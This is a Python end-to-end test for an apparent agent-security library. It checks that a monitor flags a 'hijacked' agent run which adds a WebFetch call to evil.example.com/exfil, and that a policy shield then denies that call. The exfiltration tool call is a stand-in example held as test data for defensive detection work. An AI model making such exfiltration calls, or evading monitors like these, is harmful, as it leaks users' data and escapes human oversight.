from pathlib import Path

import pytest

from agentguard.attestation import (
    AttestationStore,
    DivergenceSeverity,
    IQRDivergenceDetector,
)
from agentguard.sandbox.capture import events_to_fingerprint
from agentguard.sandbox.corpus import Probe, PromptCorpus
from agentguard.sandbox.drivers import DriverEvent, DriverEventKind, MockDriver
from agentguard.sandbox.engine import SandboxEngine
from agentguard.security.trust import TrustLevel
from agentguard.shield.enforcer import (
    InMemoryPolicySource,
    ShieldEnforcer,
    ShieldOutcome,
)


def _tool(name: str, **args: object) -> DriverEvent:
    return DriverEvent(
        kind=DriverEventKind.TOOL_CALL, tool_name=name, tool_args=dict(args)
    )


@pytest.fixture()
def asset_file(tmp_path: Path) -> Path:
    path = tmp_path / "skill.md"
    path.write_text("# demo skill\ncontroled behavior for e2e test\n")
    return path


def test_attest_diverge_detect_and_shield(
    asset_file: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    db_path = tmp_path / "agentguard.db"
    monkeypatch.setenv("AGENTGUARD_DB_PATH", str(db_path))

    from agentguard.storage import AgentGuardDB

    store = AttestationStore(db=AgentGuardDB(db_path))
    key_path = tmp_path / "key.pem"

    # 1. Attest: a benign baseline behavior.
    corpus = PromptCorpus(probes=[Probe(id="p", prompt="probe")])
    benign_driver = MockDriver(
        scripted={
            "probe": [
                _tool("Read", path="README.md"),
                _tool("WebFetch", url="https://api.anthropic.com/v1/messages"),
            ]
        }
    )
    engine = SandboxEngine(driver=benign_driver, corpus=corpus, timeout_seconds=1)
    baseline = engine.attest(
        asset_path=asset_file,
        signing_key_path=key_path,
        trust_level=TrustLevel.REVIEWED,
        store=store,
    )

    # 2. Divergence: a hijacked run adds a new egress host.
    live_events = [
        _tool("Read", path="README.md"),
        _tool("WebFetch", url="https://api.anthropic.com/v1/messages"),
        _tool("WebFetch", url="https://evil.example.com/exfil"),
    ]
    live_fp = events_to_fingerprint(live_events)
    findings = IQRDivergenceDetector().check(
        attested=baseline.fingerprint,
        live=live_fp,
        asset_content_hash=baseline.asset_content_hash,
    )
    assert any(
        f.dimension == "egress_hosts"
        and f.severity == DivergenceSeverity.CRITICAL
        and "evil.example.com" in f.observed
        for f in findings
    )

    # 3. Containment: trust-tier demote from REVIEWED → UNTRUSTED, shield
    # narrows the authority for the next tool call.
    shield = ShieldEnforcer(
        source=InMemoryPolicySource({baseline.asset_content_hash: TrustLevel.UNTRUSTED})
    )
    denied = shield.check(
        baseline.asset_content_hash,
        "WebFetch",
        {"url": "https://evil.example.com/exfil"},
    )
    assert denied.outcome == ShieldOutcome.DENY
    assert "not allowed" in denied.reason
